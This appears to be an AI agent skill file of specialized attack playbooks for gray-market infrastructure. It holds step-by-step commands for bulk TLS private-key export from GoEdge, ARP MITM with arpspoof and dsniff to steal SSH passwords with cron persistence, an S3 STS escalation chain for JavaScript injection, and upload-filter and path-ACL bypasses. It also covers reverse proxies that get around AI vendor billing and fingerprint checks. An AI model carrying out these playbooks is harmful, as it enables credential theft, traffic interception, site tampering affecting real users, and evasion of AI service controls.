---
name: specialized-attack-playbooks
description: >-
  Specialized exploitation playbooks: GoEdge private-key export, gray-market CDN forensics, ARP MITM, CDN→S3 STS chain, BT Panel+UniApp, AI IDE API reverse proxies, and OCS+MinIO; includes a references/scripts support-file index. Use when applying specialized playbooks for GoEdge, CDN, ARP MITM, BT Panel, OCS, MinIO.
metadata:
  tags: [penetration-testing, penetration-testing, red-team]
---

## Specialized Exploitation Playbooks (fully inline)

### GoEdge CDN (port 8002) bulk private-key export
```
Fingerprint: curl -s http://T:8002/ → {"message":"Welcome to API"} | POST /SSLCertService/findEnabledSSLCertConfig → requires X-Cloud-Access-Token
Vulnerability: findEnabledSSLCertConfig validates identity but not scope → any administrator key can export all system TLS private keys (keyData = plaintext PEM base64)
Two-step authentication: POST /APIAccessTokenService/getAPIAccessToken {"accessKeyId":AK,"accessKey":SK,"type":"admin"} → data.token
          Subsequent requests carry Header X-Cloud-Access-Token: <token>
Bulk extraction (Python): for id in range(1,500): POST /SSLCertService/findEnabledSSLCertConfig {"sslCertId":id} headers={token}
  → base64-decode r.json()['data']['sslCertJSON'] → JSON → dnsNames + keyData (base64 PEM private key) | skip b64=="bnVsbA==" (null)
Assets: Fofa app="GoEdge"&&port="8002" / Shodan http.title:"GoEdge" port:8002 / "Welcome to API" port:8002
Exploitation: private key → MITM/traffic decryption/certificate forgery | reuse AK/SK credentials against other GoEdge instances | gain administrative access to CDN edge nodes
```

### Post-compromise forensics on a gray-market CDN (identify what it operates after taking over the CDN)
```
Five steps: ① enumerate all certificates (IDs 1-500; expired/disabled certificates may also contain private keys and reveal historical operations) ② initial keyword classification ③ verify real access (critical! do not trust certificate domains alone;
      let requests follow redirects and inspect the final landing-page title/meta/h1/JS redirects) ④ reclassify by real content ⑤ mark high-value targets
Keyword matrix (classify dnsNames): wallet phishing: tokenpocket/tokenpoket (letter-substitution squatting)/metamask/trust | payment fraud: paypal/wxpay/bayspay/147pay
  Adult paid-site clusters: xiuren/xrw/sood/laikantu/tuhaokan/kantu | pirated video: 7she/acgzy/yiyiyi/dilige/80sjdy/mogudong
  VPN circumvention: futo-on/xyou/gogocloud/douyinjiasu/tudoujiasu | broad-site SEO: 0x000/tc7/vn00/fc000/ikkk (programmatic wildcard-DNS redirect chain) | lottery fraud: 0149/dh49/999pian (pian = fraud)
High-value markings: Grade A in-date wallet/payment private keys → MITM/HTTPS phishing with a trusted lock | Grade B ACME auto-renewing certificates enable continuous monitoring | Grade C AK/SK credential reuse + WHOIS correlation to the operator's other assets
Identification features (🔴critical): normal + adult + pirated sites co-hosted on one server | many broad-site wildcard certificates | brand and impersonation domains on the same CDN (insider-operated phishing) | one administrator key exports all private keys (GoEdge has no default isolation)
```

### ARP MITM: steal SSH passwords on the same L2 (target on the same subnet, password unknown)
```
Applicable: target on the same L2 (same Hyper-V host/same VLAN) + a controlled jump host + target SSH password unknown
🚨Key pitfall: arpspoof reports "couldn't arp for host" (libnet MAC resolution often times out on Hyper-V/CentOS7)
  Fix: ip neigh replace {TARGET_IP} lladdr {TARGET_MAC} dev eth0 nud permanent (pre-fill the gateway as well) → skip libnet resolution; arpspoof then works
Deployment: echo 1>/proc/sys/net/ipv4/ip_forward | arpspoof x4 bidirectionally (one process each for target↔gateway) | tcpdump -w x.pcap -s0 -C100 -W10 host {TARGET_IP}
  dsniff -i eth0 -w /tmp/dsniff.log (specifically captures plaintext SSH/FTP/HTTP passwords)
Persistence: crontab '*/2 * * * * /root/mitm_chk.sh' as a replacement + rc.local startup
Verification: pgrep -c arpspoof==4 | tcpdump -r x.pcap to check whether target traffic was captured
Event notification: hermes cron create 'every 2 minutes' --no-agent --deliver feishu:chat_id (notify only when there is data: the script detects new dsniff log content → outputs to stdout → delivers it; remain silent when there is no new content)
Cleanup: pkill arpspoof/tcpdump/dsniff | echo 0>ip_forward | remove the mitm line from crontab | delete each ip neigh entry | rm pcap/log
```

### Multi-layer domain-rotation CDN anti-blocking system → S3 STS credential escalation chain
```
Architecture identification: entry domain → JS redirect layer 1 (random subdomain + wildcard DNS) → redirect layer 2 → real business site (static landing)
  CDN features: Server: Xcdn | "Please access via the domain name" | 987dns.com China DNS routing (overseas returns 0.0.0.0)
  Key breakthrough points:
    ①the real business site's inline HTML JS exposes a mainDomains list (progressively nested) + base64-encoded subsite redirect configuration
    ②the deepest landing page references CDN external-origin resources (such as ug458.com/idcpc8.com) → bypass the CDN and connect directly to the origin
    ③the origin is S3 (AmazonS3 header/ListBucket public) → exposes the bucket name
    ④the same site provides an APK download → reverse it to extract the API domain + AES key + STS acquisition path
    ⑤register → login → JWT → /BBS/GetSTSToken → temporary AWS STS credentials (PutObject permission)
    ⑥S3 write access = CDN-origin tampering = JavaScript injection for all users (equivalent to RCE)
  
  Technical details:
    AES-CBC encrypted API communication: the key is exposed twice, in frontend JS (lazyDecryptImg.js) and APK (.so strings)
    ASP.NET backend: identify from the validation error format + traceId | prefer form-urlencoded (JSON may return 415)
    Registration has no verification: no SMS/no CAPTCHA/any phone number → bulk registration may be possible
    Overprivileged STS: ordinary user role receives s3:PutObject → overwrite CDN-origin files
    Public S3 bucket ListBucket: the prefix parameter is ineffective (CDN cache), but the S3 domain can be enumerated fully when accessed directly
  Reference: references/cdn-antiblock-s3-attack-chain.md
```

### BT Panel penetration testing + UniApp/DCloud APK reversing
```
=== BT Panel fingerprinting ===
Fingerprint: ports 19362/8888/random high ports + Cookie name containing a 32-character MD5 hash + "_ssl" suffix (for example, 721301c19a31e887cb1f5a5726fbaae5_ssl)
  Set-Cookie appearing in a 404 response = confirmed BT Panel; port 888 commonly hosts phpMyAdmin (403 = IP allowlist)
Security entry: new BT Panel versions enforce a random 8-character path (/xxxxxxxx/); without guessing it, the panel cannot be reached. All API endpoints are behind the security entry path.
  Brute-force strategy: domain-related variants (bt + domain prefix) + common administrator habits (admin888/bt123456/btpanel) + 8-character random values (very low success rate)
  Bypass: no known universal bypass (2024+); old CVE-2023-38038 (unauthorized phpMyAdmin) applies only to <=7.7
  Lateral approach: multiple sites on one IP share BT Panel → break into a weaker site → move laterally to the target site; the default BT Panel www user controls every site

=== UniApp/DCloud APK reversing (high efficiency) ===
Identify: assets/dcloud_uniplugins.json + assets/apps/<appid>/ + uni-jsframework.js
Core: all business logic is in the JS/Vue files under assets/apps/<appid>/www/ (no jadx Java decompilation required)
  API extraction: grep -r 'https\?://' assets/apps/ | filter for baseURL/apiUrl/request configuration
  Authentication: search token/key/secret/Authorization → hardcoded credentials are common in config.js/env.js/manifest.json
  Encryption: search aes/encrypt/decrypt/sign → frontend encryption = plaintext (the key must be in the JS)
  WebSocket: search wss://ws:// → real-time communication backend address
Priority: manifest.json (appid/version/permissions) → config- or env-related JS (API addresses) → page JS (business logic/IDOR)

=== ChengZi (d3504.cn) site-building SDK decryption ===
Scenario: adult/gray-market app distribution landing pages commonly use ChengZi for no-fill invitations + redirects + APK distribution
init3 endpoint: POST /web/<appkey>/<channel>/init3 → returns URL-safe base64-encoded XOR-encrypted data
Decryption: base64url_decode → bytewise XOR 0x96 → JSON (including fu = download URL, ph = package path, fm = redirect method)
  Script: scripts/chengzi_decrypt.py
Exploitation: decrypt to obtain the real APK's Aliyun FC function URL → download the APK → reverse it to extract the backend API
```

### AI IDE API reverse proxies/key-leak directories (discover and assess reverse-proxy options for AI coding tools)
```
Background: since 2026-04, Cursor Web's free API retains only gemini-3-flash; Claude is fully removed → Claude 4.6+ requires another channel
Available options: freemodel-cc-proxy (free, genuine Claude through FreeModel, disguises its Claude Code fingerprint to bypass 403, Opus4.8/Sonnet4.6) | WindsurfAPI (dwgx, Windsurf gRPC-to-API, 100+ models, account-pool rotation)
  askalf/dario (Claude Pro/Max subscription converted to API, bypasses headless billing) | bypass/chatgpt-adapter (xllm-go, aggregates multiple reverse-engineered interfaces into OpenAI format)
Deprecated: cursor2api/cursor2api-go (only gemini-3-flash remains) | auxiliary: claude-tap (MITM-captures real AI Agent traffic to study system prompts/tool calls)
GitHub search method: api.github.com/search/repositories?q=cursor+api+reverse+proxy&sort=stars → filter descriptions → /repos/<o>/<r>/readme (base64-decode and read) → /search/issues for current status
Keywords: cursor api reverse proxy / cursor workos token / claude proxy cursor / AI IDE api reverse engineering
```

### OCS online customer-service system penetration testing + MinIO object-storage exploitation
```
Entry discovery: the landing-page HTML customer-service link exposes an OCS domain (such as leiyushan.com) → use Playwright to load the SPA and intercept real API calls
Authentication flow: POST /api/v1/v/init {cid,vid} → data.tk = visitor token; subsequent requests use header x-v-token: <token>
Core APIs: /api/v1/v/bc (start chat) /api/v1/v/oss/sign (obtain upload signature) /api/v1/v/message/send (send message)
Upload chain: GET /api/v1/v/oss/sign → {sn,et,ul,ulw,dir,cid,og} → POST https://UL/api/v1/f/wj/tr
  Headers: sign=<sn>, expTime=<et>  Form: file=@file, cid=<cid>, dir=<dir>, og=<og>, fn=<filename>, fg=0
Blacklist bypass (extensions outside the allowlist are blocked):
  ✓ .jsp.jpg (double extension; final extension passes the check) ✓ .jsp%00.jpg (null-byte truncation) ✓ .jsp;.jpg (Tomcat path parameter)
  ✗ .jsp/.jspx/.JSP/.Jsp/war/php/py/sh/xml/svg/html/txt/json/yaml/properties/sql/doc/ini/conf
⚠️ File storage in MinIO object storage = static object; Tomcat will not execute it (it requires writing into the webroot for RCE)
  Verification: curl https://UL/bucket/dir/date/filename → returns file content (plain text, not execution)
Directory traversal in the dir parameter: the sign service does not validate dir contents (always returns a fixed-bucket sign); the upload service checks bucket permissions
  dir=conf → 500 (attempt to write the conf bucket, but insufficient permissions) dir=../../ → 500 (traversal rejected)
MinIO Console (port 9001): POST /api/v1/login {"accessKey":"X","secretKey":"Y"} → 403 = invalid Login
  CVE-2023-28432: POST /minio/health/cluster?verify → patched in newer versions (returns BadRequest without exposing env)
CDN-layer identification (response-size fingerprints):
  CDN WAF block page ~2000 bytes | WSCN JS challenge page ~6000 bytes (Embed Iframe) | nginx 404 = 146 bytes
  Spring Boot JSON 404 ~100 bytes | Tomcat HTML 404 ~435 bytes
nginx method restriction: admin paths (/api/v1/a/ /api/v1/s/) allow only GET → POST returns 405
WSCN/Wangsu CDN JS challenge: Playwright passes it automatically | path allowlists are independent of the JS challenge (passing the challenge still leaves path ACL blocking)
Spring Boot path traversal: /c/..;/path → bypasses the nginx path ACL and reaches Spring Boot (semicolon = Tomcat path-parameter truncation)
BT Panel entry: Set-Cookie leaks the cookie name → the 8-character random entry path cannot be derived; only brute-force enumeration works
Longteng CDN: TLS certificate exposes all associated domains | Server header exposes the origin OS version
```

## Supporting File Index

```
=== references/ attack-chain records ===
cdn-antiblock-s3-attack-chain.md        multi-layer domain-rotation CDN anti-blocking → S3 STS credential escalation chain
faka-system-attack-chain.md             card-selling system (XHFAKA/Xinghai) enumeration/second-order XSS/lock bypass/WAF blind spots
ocs-im-system-attack-chain.md           complete OCS online customer-service IM-system attack chain
ocs-minio-upload-attack-chain.md        OCS upload → MinIO object-storage exploitation chain
chinese-app-distribution-pentest.md     domestic gray-market app-distribution landing-page penetration (ChengZi/FC/CDN)
phpcms-v9-attack-surface.md             PHPCMS V9 attack surface

=== references/ CDN/Spring/WebSocket bypasses ===
spring-boot-cdn-bypass.md               Spring Boot Actuator path traversal + interceptor bypass
cdn-waf-bypass-spring-boot.md           CDN WAF bypass (502/JS challenge) + Spring backend
cdn-bypass-gccdn-ocs.md                 GCCDN/Wangsu response-filter bypass
cdn-websocket-bypass-spring-auth.md     WebSocket upgrade through CDN to reach Spring
stomp-websocket-cdn-bypass.md           STOMP over SockJS CDN bypass
sockjs-stomp-exploitation.md            SockJS/STOMP privilege escalation + SpEL injection
spring-stomp-sockjs-exploitation.md     Spring STOMP authentication + unauthorized subscription

=== references/ nginx/PHP fingerprints ===
nginx-pathinfo-bypass-and-fingerprint.md   PATH_INFO deny bypass + response-size fingerprinting
nginx-php-fingerprint-bypass.md            nginx/PHP-FPM differential fingerprinting
nginx-404-differential-fingerprinting.md   catch-all vs real 404 differential enumeration

=== references/ APK reversing ===
uniapp-apk-reverse-engineering.md       complete UniApp/DCloud reversing (JS/.so/.dat)
uniapp-apk-reversing.md                 UniApp reversing quick reference (RC4 deobfuscation + domain discovery)
uniapp-dcloud-apk-reversing.md          DCloud structure + HTTPDNS identification
bt-panel-attack-methodology.md          BT Panel fingerprinting + entry brute force + lateral movement

=== scripts/ ===
js_rc4_deobfuscate.js       JS RC4 + rotating-string-array deobfuscation (extract → node decode)
chengzi_decrypt.py          ChengZi init3 XOR decryption (fu download URL)
decrypt_aes_cbc_api.py      AES-CBC encrypted API communication decryption template (hardcoded key/iv)
s3_sts_exploit.py           AWS S3 STS temporary-credential exploitation (verification/listing/writing/permission enumeration)
stomp_sockjs_exploit.py     STOMP over SockJS exploitation template (CDN bypass + authentication + injection)
spring_stomp_exploit.py     Spring STOMP unauthorized subscription/send

```
